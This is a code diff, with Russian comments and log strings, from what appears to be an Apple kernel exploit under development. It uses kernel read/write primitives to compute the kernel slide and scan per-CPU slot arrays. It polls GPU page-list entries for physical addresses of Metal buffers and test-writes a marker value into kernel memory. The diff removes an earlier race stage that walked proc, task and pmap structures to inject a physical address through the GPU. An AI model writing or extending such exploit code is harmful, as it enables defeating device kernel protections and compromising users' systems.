@@ -5348,33 +5348,38 @@ static void *kpRaceHammer(void *arg)
     return NULL;
 }
 
-// D3 reader: ловит PA нашего буфера в поле0 записей листа + лог ненулевых
-static uint64_t gRdBuf = 0;
+// D3 multi-reader: поллит ВСЕ кандидаты, маркер по sigPA
 static uint64_t *gRdPAs = NULL;
 static int gRdNPA = 0;
 static volatile int gRdHits = 0;
 static volatile int gRdStop = 0;
+static int gRdWinCand = -1;
+static uint64_t gRdCands[24];
+static int gRdNCand = 0;
 static volatile unsigned gRdLogN = 0;
-static int gRdLogI[512];
-static uint64_t gRdLogV0[512], gRdLogV1[512];
-static void *kpListReader(void *arg)
+static int gRdLogC[512], gRdLogI[512];
+static uint64_t gRdLogV0[512];
+static void *kpListReaderMulti(void *arg)
 {
     (void)arg;
     while (!gRdStop) {
-        for (int i = 0; i < 64; i++) {
-            uint64_t f0 = kp_rc_kread64(gRdBuf + (uint64_t)i * 0x10);
-            if (!f0) continue;
-            uint64_t f1 = kp_rc_kread64(gRdBuf + (uint64_t)i * 0x10 + 8);
-            unsigned slot = gRdLogN;
-            if (slot < 512) {
-                gRdLogI[slot] = i; gRdLogV0[slot] = f0; gRdLogV1[slot] = f1;
-                gRdLogN = slot + 1;
-            }
-            for (int j = 0; j < gRdNPA; j++) {
-                if (f0 == gRdPAs[j]) {
-                    gRdHits++;
-                    kpGartLive([NSString stringWithFormat:@"    D3 ПОПАДАНИЕ: запись[%d] поле0=%#llx == sigPA[%d]", i, f0, j]);
-                    break;
+        for (int c = 0; c < gRdNCand; c++) {
+            uint64_t bv = gRdCands[c];
+            for (int i = 0; i < 64; i++) {
+                uint64_t f0 = kp_rc_kread64(bv + (uint64_t)i * 0x10);
+                if (!f0) continue;
+                for (int j = 0; j < gRdNPA; j++) {
+                    if (f0 == gRdPAs[j]) {
+                        gRdHits++;
+                        if (gRdWinCand < 0) gRdWinCand = c;
+                        unsigned slot = gRdLogN;
+                        if (slot < 512) {
+                            gRdLogC[slot] = c; gRdLogI[slot] = i; gRdLogV0[slot] = f0;
+                            gRdLogN = slot + 1;
+                        }
+                        kpGartLive([NSString stringWithFormat:@"    D3v3 ПОПАДАНИЕ: cand[%d] rec[%d] поле0=%#llx == sigPA[%d]", c, i, f0, j]);
+                        break;
+                    }
                 }
             }
         }
@@ -5396,60 +5401,48 @@ static void *kpListReader(void *arg)
     extern uint64_t kp_rc_kread64(uint64_t);
     extern void kp_rc_kwrite64(uint64_t, uint64_t);
 
-    // === D-диагностика compacted list: пять стадий, каждая с заранее
-    //     объявленным критерием. D1 формула (3× стабильность), D2 rest-дамп
-    //     (нейтральные поля), D3 ПРИВЯЗКА (наши PA в листе во время нашего
-    //     submit — читатель на отдельном треде), D4 префлайт записи,
-    //     D5 гонка (только если D3 доказана; qword1=1 пишется ПЕРВЫМ —
-    //     count>1 + чужой PA = out-of-bounds EL2-килл, причина смерти 1.9.82).
+    // === D3v3: перебор per-CPU слотов. D3v2 опровергла формульную ячейку
+    //     (512 записей во время map, 0 наших PA — это retype/alloc-лист, не
+    //     map-лист страниц буфера). Ищем соседнюю: дамп массива слотов вокруг
+    //     slotBase, кандидаты = kernel pointers, мульти-опрос ВСЕХ во время
+    //     большого submit. Критерий: ≥1 sigPA в поле0 любой записи кандидата.
     extern uint64_t kp_rc_kread64(uint64_t);
-    extern void kp_rc_kwrite64(uint64_t, uint64_t);
     extern uint64_t vtophys(uint64_t, uint64_t);
-    GNOTE( @"  D0: kp_rc_kread64 не различает «0 в памяти» и «сбой чтения» — все нули ниже трактуются как прочитанные значения. Стадии эксплоита (E9, [FATAL] early_kread) к этой секции отношения не имеют.");
+    GNOTE( @"  D0: нули ниже — прочитанные значения (kp_rc_kread64 не различает 0 и сбой).");
 
-    // D1. формула bufVA — 3 независимых чтения на шаг (стабильность)
+    // D1. формула + дамп массива слотов
     uint64_t kc = kconstant(base);
     uint64_t slide = kc - 0xfffffff007004000ULL;
     uint64_t cpuData = 0xfffffff00aa44000ULL + slide;
     uint64_t slotBase = 0xfffffff00aa48000ULL + slide;
-    uint64_t v1 = kp_rc_kread64(cpuData + 0x1a0), v2 = kp_rc_kread64(cpuData + 0x1a0), v3 = kp_rc_kread64(cpuData + 0x1a0);
-    uint64_t bufVA = kp_rc_kread64(slotBase + (v1 >> 16) + 8);
-    uint64_t bufVA_b = kp_rc_kread64(slotBase + (v1 >> 16) + 8);
-    BOOL stable = (v1 == v2 && v2 == v3) && (bufVA == bufVA_b);
-    GNOTE( [NSString stringWithFormat:@"  D1: slide=%#llx val(+0x1a0)=%#llx/%#llx/%#llx bufVA=%#llx/%#llx стабильность=%@",
-               slide, v1, v2, v3, bufVA, bufVA_b, stable ? @"да" : @"НЕТ"]);
-    if (!kpLooksLikeKernelPointer(bufVA)) { GNOTE( @"  D1 FAIL: bufVA не kernel pointer — дальше бессмысленно"); gGartLive = NO; return r; }
-    uint64_t tableVA = [self frameTableVAWithLog:r];
-    int ftBuf = kpVAType(bufVA, tableVA);
-    GNOTE( [NSString stringWithFormat:@"  D1: bufVA frame type=0x%x (0x0b — класс, эмпирически записываемый в v9)", ftBuf]);
+    uint64_t v1 = kp_rc_kread64(cpuData + 0x1a0);
+    uint64_t slotVA = slotBase + (v1 >> 16);
+    uint64_t bufVA = kp_rc_kread64(slotVA + 8);
+    GNOTE( [NSString stringWithFormat:@"  D1: slide=%#llx val=%#llx slotVA=%#llx bufVA(retype-кандидат)=%#llx", slide, v1, slotVA, bufVA]);
 
-    // D2. rest-дамп ×2 снимка через 1 сек, нейтральные имена полей
-    for (int snap = 0; snap < 2; snap++) {
-        if (snap) usleep(1000000);
-        GNOTE( [NSString stringWithFormat:@"  D2 снимок %d (поле0/поле1, сыро):", snap]);
-        for (int i = 0; i < 6; i++) {
-            uint64_t f0 = kp_rc_kread64(bufVA + (uint64_t)i * 0x10);
-            uint64_t f1 = kp_rc_kread64(bufVA + (uint64_t)i * 0x10 + 8);
-            GNOTE( [NSString stringWithFormat:@"    [%d] поле0=%#llx поле1=%#llx", i, f0, f1]);
-        }
+    uint64_t cands[24]; int ncand = 0;
+    GNOTE( @"  D1: дамп слотов slotVA-0x100 .. slotVA+0x200 (kernel pointers):");
+    for (int64_t off = -0x100; off <= 0x200 && ncand < 24; off += 8) {
+        uint64_t v = kp_rc_kread64(slotVA + off);
+        if (!kpLooksLikeKernelPointer(v)) continue;
+        BOOL dup = NO;
+        for (int q = 0; q < ncand; q++) if (cands[q] == v) { dup = YES; break; }
+        if (dup) continue;
+        cands[ncand] = v;
+        GNOTE( [NSString stringWithFormat:@"    cand[%d] slotVA%+0x%llx → %#llx", ncand, off < 0 ? off : 0, v]);
+        ncand++;
     }
+    if (!ncand) { GNOTE( @"  D1 FAIL: кандидатов нет"); gGartLive = NO; return r; }
 
-    // D3v2. ПРИВЯЗКА с длинным окном: ГИГАНТСКИЙ private-буфер (256 МБ =
-    //     16384 страницы; fill идёт пачками по batch-cap → много окон подряд,
-    //     каждое миллисекунды). Сигнатуры в первые 64 страницы; читатель
-    //     поллит 64 записи и СКЛАДЫВАЕТ все ненулевые в лог (после — сверка).
-    //     Критерий: ≥1 запись с поле0 ∈ sigPA = привязка доказана эмпирически.
+    // D3v3. большой буфер + sig-страницы (как в D3v2)
     id<MTLDevice> mtl = MTLCreateSystemDefaultDevice();
     id<MTLBuffer> bufB = nil;
-    NSUInteger bigLen = 0x10000000;   // 256 МБ
+    NSUInteger bigLen = 0x10000000;
     bufB = mtl ? [mtl newBufferWithLength:bigLen options:MTLResourceStorageModePrivate] : nil;
-    if (!bufB) {
-        bigLen = 0x4000000;           // fallback 64 МБ
-        bufB = mtl ? [mtl newBufferWithLength:bigLen options:MTLResourceStorageModePrivate] : nil;
-    }
-    if (!bufB) { GNOTE( @"FAIL: private buffer (256/64 МБ)"); gGartLive = NO; return r; }
+    if (!bufB) { bigLen = 0x4000000; bufB = mtl ? [mtl newBufferWithLength:bigLen options:MTLResourceStorageModePrivate] : nil; }
+    if (!bufB) { GNOTE( @"FAIL: private buffer"); gGartLive = NO; return r; }
     uint64_t gvaB = (uint64_t)bufB.gpuAddress;
-    GNOTE( [NSString stringWithFormat:@"  D3v2: буфер %#lx байт gpuAddr=%#llx", (unsigned long)bigLen, gvaB]);
+    GNOTE( [NSString stringWithFormat:@"  D3v3: буфер %#lx gpuAddr=%#llx", (unsigned long)bigLen, gvaB]);
     @autoreleasepool {
         NSError *err = nil;
         id<MTLLibrary> lib = [mtl newLibraryWithSource:
@@ -5468,9 +5461,9 @@ static void *kpListReader(void *arg)
             [cb commit];
             [cb waitUntilCompleted];
         }
-        GNOTE( [NSString stringWithFormat:@"  D3v2: сигнатурный submit (64 стр.) status=%ld", (long)cb.status]);
+        GNOTE( [NSString stringWithFormat:@"  D3v3: сигнатурный submit status=%ld", (long)cb.status]);
     }
-    // sig-scan (enum + heap scan) → sigPA (до 64)
+    uint64_t tableVA = [self frameTableVAWithLog:r];
     uint32_t totalPages = (uint32_t)(kconstant(physSize) >> 14);
     uint32_t *heapPages = malloc((size_t)totalPages * 4);
     if (!heapPages) { GNOTE( @"FAIL: malloc"); gGartLive = NO; return r; }
@@ -5498,13 +5491,15 @@ static void *kpListReader(void *arg)
         sigPA[nsig++] = pa;
     }
     free(heapPages);
-    GNOTE( [NSString stringWithFormat:@"  D3v2: sig-страниц=%d из 64 (первый PA=%#llx)", nsig, nsig ? sigPA[0] : 0]);
-    if (nsig < 8) { GNOTE( @"  D3v2 FAIL: мало sig-страниц"); gGartLive = NO; return r; }
+    GNOTE( [NSString stringWithFormat:@"  D3v3: sig-страниц=%d (первый PA=%#llx)", nsig, nsig ? sigPA[0] : 0]);
+    if (nsig < 8) { GNOTE( @"  D3v3 FAIL: мало sig-страниц"); gGartLive = NO; return r; }
 
-    // читатель: полл 64 записей, лог всех ненулевых (до 512), маркер по sigPA
-    gRdBuf = bufVA; gRdPAs = sigPA; gRdNPA = nsig; gRdHits = 0; gRdStop = 0; gRdLogN = 0;
+    // мульти-опрос: reader поллит ВСЕ кандидаты, маркер по sigPA
+    gRdPAs = sigPA; gRdNPA = nsig; gRdHits = 0; gRdStop = 0; gRdLogN = 0;
+    gRdNCand = ncand;
+    memcpy(gRdCands, cands, sizeof(cands));
     pthread_t rt;
-    pthread_create(&rt, NULL, kpListReader, NULL);
+    pthread_create(&rt, NULL, kpListReaderMulti, NULL);
     @autoreleasepool {
         NSError *err = nil;
         id<MTLLibrary> lib = [mtl newLibraryWithSource:@"kernel void wf(device ulong *o [[buffer(0)]]) { o[0] = 2; }" options:nil error:&err];
@@ -5521,93 +5516,29 @@ static void *kpListReader(void *arg)
             [cb commit];
             [cb waitUntilCompleted];
         }
-        GNOTE( [NSString stringWithFormat:@"  D3v2: submit#2 (большой буфер) status=%ld", (long)cb.status]);
+        GNOTE( [NSString stringWithFormat:@"  D3v3: submit#2 status=%ld", (long)cb.status]);
     }
-    usleep(200000);
+    usleep(300000);
     gRdStop = 1;
     pthread_join(rt, NULL);
-    GNOTE( [NSString stringWithFormat:@"  D3v2: лог записей=%u, ПОПАДАНИЙ sigPA=%d %@", (unsigned)gRdLogN, gRdHits,
-               gRdHits ? @"— ПРИВЯЗКА ДОКАЗАНА ЭМПИРИЧЕСКИ" : @"— привязка НЕ подтверждена"]);
-    for (unsigned di = 0; di < gRdLogN && di < 24; di++)
-        GNOTE( [NSString stringWithFormat:@"    log[%u] rec[%d] поле0=%#llx поле1=%#llx", di, gRdLogI[di], gRdLogV0[di], gRdLogV1[di]]);
+    GNOTE( [NSString stringWithFormat:@"  D3v3: лог=%u попаданий=%d %@", (unsigned)gRdLogN, gRdHits,
+               gRdHits ? @"— ПРИВЯЗКА НАЙДЕНА" : @"— ни один кандидат не несёт наши страницы"]);
+    for (unsigned di = 0; di < gRdLogN && di < 32; di++)
+        GNOTE( [NSString stringWithFormat:@"    log[%u] cand[%d] rec[%d] поле0=%#llx", di, gRdLogC[di], gRdLogI[di], gRdLogV0[di]]);
 
-    // D4. префлайт записи (повтор на этом буте)
+    // D4. префлайт записи в ПОБЕДИТЕЛЯ (если есть) иначе в bufVA
+    extern void kp_rc_kwrite64(uint64_t, uint64_t);
+    uint64_t target = bufVA;
+    if (gRdHits && gRdWinCand >= 0 && gRdWinCand < ncand) target = cands[gRdWinCand];
     {
-        uint64_t orig = kp_rc_kread64(bufVA);
-        kp_rc_kwrite64(bufVA, 0x4141414141414141ULL);
-        uint64_t rb = kp_rc_kread64(bufVA);
-        kp_rc_kwrite64(bufVA, orig);
-        GNOTE( [NSString stringWithFormat:@"  D4: префлайт записи в bufVA: %@ (rb=%#llx)", rb == 0x4141414141414141ULL ? @"ПИШЕТСЯ ✓" : @"НЕ ПРИЛИПЛО", rb]);
+        uint64_t orig = kp_rc_kread64(target);
+        kp_rc_kwrite64(target, 0x4141414141414141ULL);
+        uint64_t rb = kp_rc_kread64(target);
+        kp_rc_kwrite64(target, orig);
+        GNOTE( [NSString stringWithFormat:@"  D4: префлайт записи в %#llx: %@ (rb=%#llx)", target,
+                   rb == 0x4141414141414141ULL ? @"ПИШЕТСЯ ✓" : @"НЕ ПРИЛИПЛО", rb]);
     }
-
-    // D5. гонка — только если D3 доказана. Молот: поле1=1 ПЕРВЫМ (иначе
-    //     count>1 × наш PA = out-of-bounds EL2-килл, причина смерти 1.9.82),
-    //     затем поле0=paX. Жертва: shared-буфер, submit копирует buf[0]→res[0].
-    if (!gRdHits) { GNOTE( @"  D5: ПРОПУСК — без доказанной привязки гонка бессмысленна"); gGartLive = NO; return r; }
-    if (![self rcIsTableWithLog:r]) { [r appendString:@"FAIL: is_table\n"]; gGartLive = NO; return r; }
-    mach_port_t tp = mach_thread_self();
-    uint64_t tva = [self rcResolveThreadKVA:tp];
-    mach_port_deallocate(mach_task_self(), tp);
-    uint64_t tro = kp_untag_ptr(kp_rc_kread64(tva + 0x3E8));
-    uint64_t sproc = kp_untag_ptr(kp_rc_kread64(tro + off_thread_ro_tro_proc));
-    uint64_t pro = kp_untag_ptr(kp_rc_kread64(sproc + off_proc_p_proc_ro));
-    uint64_t stask = kp_untag_ptr(kp_rc_kread64(pro + off_proc_ro_pr_task));
-    uint64_t smap = kp_untag_ptr(kp_rc_kread64(stask + off_task_map));
-    uint64_t spmap = kp_untag_ptr(kp_rc_kread64(smap + koffsetof(vm_map, pmap)));
-    uint64_t ttep = kp_untag_ptr(kp_rc_kread64(spmap + koffsetof(pmap, ttep)));
-    vm_address_t sva = 0;
-    if (vm_allocate(mach_task_self(), &sva, 0x4000, VM_FLAGS_ANYWHERE) != KERN_SUCCESS ||
-        mlock((void *)sva, 0x4000) != 0) { GNOTE( @"FAIL: vm_allocate/mlock"); gGartLive = NO; return r; }
-    memset((void *)sva, 0, 0x4000);
-    *(volatile uint64_t *)sva = 0x4142434445464748ULL;
-    uint64_t paX = vtophys(ttep, sva);
-    GNOTE( [NSString stringWithFormat:@"  D5: сентинель paX=%#llx", paX]);
-    if (!paX) { GNOTE( @"FAIL: vtophys"); goto out_s; }
-    gRaceBufs[0] = bufVA; gRaceN = 1; gRacePA = paX; gRaceStop = 0;
-    {
-        pthread_t ht;
-        pthread_create(&ht, NULL, kpRaceHammer, NULL);
-        NSError *err = nil;
-        id<MTLLibrary> lib = [mtl newLibraryWithSource:
-            @"kernel void cp(device ulong *src [[buffer(0)]], device ulong *dst [[buffer(1)]]) { dst[0] = src[0]; }"
-            options:nil error:&err];
-        id<MTLFunction> fn = lib ? [lib newFunctionWithName:@"cp"] : nil;
-        id<MTLComputePipelineState> pipe = fn ? [mtl newComputePipelineStateWithFunction:fn error:&err] : nil;
-        id<MTLCommandQueue> q = pipe ? [mtl newCommandQueue] : nil;
-        if (!q) { GNOTE( @"FAIL: pipeline"); gRaceStop = 1; pthread_join(ht, NULL); goto out_s; }
-        int hits = 0, weird = 0;
-        for (int it = 0; it < 1500 && !hits; it++) {
-            @autoreleasepool {
-                id<MTLBuffer> sb = [mtl newBufferWithLength:0x4000 options:MTLResourceStorageModeShared];
-                id<MTLBuffer> rb = [mtl newBufferWithLength:0x4000 options:MTLResourceStorageModeShared];
-                *(uint64_t *)sb.contents = 0xAAAAAAAAAAAAAAAAULL;
-                *(uint64_t *)rb.contents = 0;
-                id<MTLCommandBuffer> cb = [q commandBuffer];
-                id<MTLComputeCommandEncoder> enc = [cb computeCommandEncoder];
-                [enc setComputePipelineState:pipe];
-                [enc setBuffer:sb offset:0 atIndex:0];
-                [enc setBuffer:rb offset:0 atIndex:1];
-                [enc dispatchThreads:MTLSizeMake(1,1,1) threadsPerThreadgroup:MTLSizeMake(1,1,1)];
-                [enc endEncoding];
-                [cb commit];
-                [cb waitUntilCompleted];
-                uint64_t got = *(uint64_t *)rb.contents;
-                if (got == 0x4142434445464748ULL) {
-                    hits++;
-                    GNOTE( [NSString stringWithFormat:@"★★★ ИНЪЕКЦИЯ! iter=%d got=%#llx ★★★", it, got]);
-                } else if (got != 0xAAAAAAAAAAAAAAAAULL) {
-                    if (++weird <= 8) GNOTE( [NSString stringWithFormat:@"  странное: iter=%d got=%#llx", it, got]);
-                }
-                if (it && (it % 500) == 0) GNOTE( [NSString stringWithFormat:@"  race: %d итераций…", it]);
-            }
-        }
-        gRaceStop = 1;
-        pthread_join(ht, NULL);
-        GNOTE( [NSString stringWithFormat:@"  D5 итог: hits=%d weird=%d", hits, weird]);
-    }
-out_s:
-    munlock((void *)sva, 0x4000);
-    vm_deallocate(mach_task_self(), sva, 0x4000);
+    GNOTE( [NSString stringWithFormat:@"  ВЕРДИКТ: winCand=%d target=%#llx", gRdHits ? gRdWinCand : -1, target]);
     gGartLive = NO;
     return r;
 }
